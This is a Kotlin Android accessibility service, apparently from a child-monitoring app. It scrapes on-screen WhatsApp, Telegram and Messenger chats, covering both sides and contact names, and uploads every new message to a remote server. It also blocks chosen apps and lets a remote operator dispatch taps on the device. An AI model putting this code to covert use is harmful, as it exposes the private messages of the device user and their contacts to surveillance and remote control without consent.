package com.monitor.child

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.Collections

/**
 * Reads messages from the screen when a chat is open in a supported messaging app, using the
 * Accessibility API. Captures both sides of a conversation as it is viewed/scrolled — more than
 * notifications, but only what is actually on screen (not archived or unopened chats).
 *
 * This depends on each app's on-screen layout (view ids), so it is best-effort and may need tuning
 * per app version. Reported as `message` events with source "chat".
 */
class ChatReaderService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var store: Store

    // Bounded LRU of recently reported message fingerprints, to avoid re-sending the same visible
    // messages on every scroll/update.
    private val recent: MutableSet<String> = Collections.newSetFromMap(
        object : LinkedHashMap<String, Boolean>(512, 0.75f, true) {
            override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Boolean>?): Boolean =
                size > 500
        },
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        store = Store(this)
        instance = this
    }

    /** Perform a tap at screen coordinates — used for remote control. */
    fun tap(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !::store.isInitialized) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        // App limits: if a blocked app comes to the foreground, send the user back to home.
        if (pkg in store.blockedApps) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            return
        }

        if (pkg !in MESSAGING_APPS) return
        val token = store.deviceToken ?: return

        val root = rootInActiveWindow ?: return
        val chatName = extractTitle(root, pkg)
        val texts = ArrayList<String>()
        collectMessageTexts(root, texts)
        root.recycle()
        if (texts.isEmpty()) return

        val fresh = ArrayList<String>()
        synchronized(recent) {
            for (t in texts) {
                if (t == chatName || t.length > 1000 || UI_NOISE.matches(t)) continue
                if (recent.add("$pkg|$chatName|$t")) fresh.add(t)
            }
        }
        if (fresh.isEmpty()) return

        val baseUrl = store.baseUrl
        scope.launch {
            val api = Api(baseUrl)
            for (t in fresh) {
                api.postMessage(token, pkg, chatName, t, Instant.now().toString(), source = "chat")
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        if (instance === this) instance = null
        scope.cancel()
        super.onDestroy()
    }

    private fun extractTitle(root: AccessibilityNodeInfo, pkg: String): String? {
        for (id in TITLE_IDS) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id) ?: continue
            var title: String? = null
            for (n in nodes) {
                if (title == null) {
                    val t = n.text?.toString()
                    if (!t.isNullOrBlank()) title = t
                }
                n.recycle()
            }
            if (title != null) return title
        }
        return null
    }

    // Collect text from leaf TextView nodes on screen. Works across app versions since it does not
    // rely on internal view ids; the UI_NOISE filter + chat title removal drop most non-message text.
    private fun collectMessageTexts(node: AccessibilityNodeInfo?, out: MutableList<String>) {
        if (node == null) return
        if (node.childCount == 0) {
            val cls = node.className?.toString().orEmpty()
            val t = node.text?.toString()?.trim()
            if (!t.isNullOrBlank() && cls.contains("TextView", ignoreCase = true)) out.add(t)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            collectMessageTexts(child, out)
            child?.recycle()
        }
    }

    companion object {
        // The running service, so ScreenService can dispatch remote taps through accessibility.
        @Volatile
        var instance: ChatReaderService? = null

        private val MESSAGING_APPS = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "org.telegram.messenger",
            "com.facebook.orca",
        )
        // On-screen text that is UI chrome, not a message — dropped before sending.
        private val UI_NOISE = Regex(
            "^(\\d{1,2}:\\d{2}(\\s?[aApP]\\.?[mM]\\.?)?|today|yesterday|monday|tuesday|wednesday|" +
                "thursday|friday|saturday|sunday|message|online|typing…|typing\\.\\.\\.|" +
                "\\d+ new messages?|checking for new messages\\.?|\\d+ messages? from \\d+ chats?|" +
                "chats|calls|updates|communities|status|photo|video|voice message|gif|sticker)$",
            RegexOption.IGNORE_CASE,
        )
        // Chat title (contact/group name) view ids.
        private val TITLE_IDS = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "org.telegram.messenger:id/action_bar_title",
        )
    }
}
